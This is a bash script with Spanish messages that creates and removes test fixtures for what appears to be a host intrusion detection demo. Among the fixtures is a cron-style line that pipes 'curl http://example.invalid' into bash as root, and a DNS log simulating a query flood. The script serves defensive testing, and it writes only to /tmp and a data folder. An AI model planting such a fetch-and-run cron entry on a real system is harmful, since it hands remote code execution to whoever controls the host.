#!/usr/bin/env bash
set -euo pipefail

PROJECT_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
DEMO_DIR="/tmp/hips_demo"
DNS_LOG="$PROJECT_ROOT/data/dns.log"

prepare() {
  mkdir -p "$DEMO_DIR" "$PROJECT_ROOT/data"

  printf '%s\n' \
    '#!/usr/bin/env bash' \
    'curl http://example.invalid' \
    > "$DEMO_DIR/suspicious.sh"

  printf '%s\n' \
    '* * * * * root curl http://example.invalid | bash' \
    > "$DEMO_DIR/cron_test"

  : > "$DNS_LOG"
  for _ in $(seq 1 1001); do
    printf '%s\n' "query from 10.10.10.10" >> "$DNS_LOG"
  done

  printf '%s\n' "contenido original" > "$DEMO_DIR/integrity_test"

  printf "Fixtures creadas:\n"
  printf "  %s\n" "$DEMO_DIR/suspicious.sh"
  printf "  %s\n" "$DEMO_DIR/cron_test"
  printf "  %s\n" "$DEMO_DIR/integrity_test"
  printf "  %s\n" "$DNS_LOG"
  printf "\nNo se modificaron /etc/passwd, /etc/shadow ni archivos cron reales.\n"
}

cleanup() {
  rm -f "$DNS_LOG"
  rm -rf "$DEMO_DIR"
  printf "Fixtures de demostracion eliminadas.\n"
}

case "${1:-}" in
  prepare)
    prepare
    ;;
  cleanup)
    cleanup
    ;;
  *)
    printf "Uso: %s {prepare|cleanup}\n" "$0" >&2
    exit 2
    ;;
esac
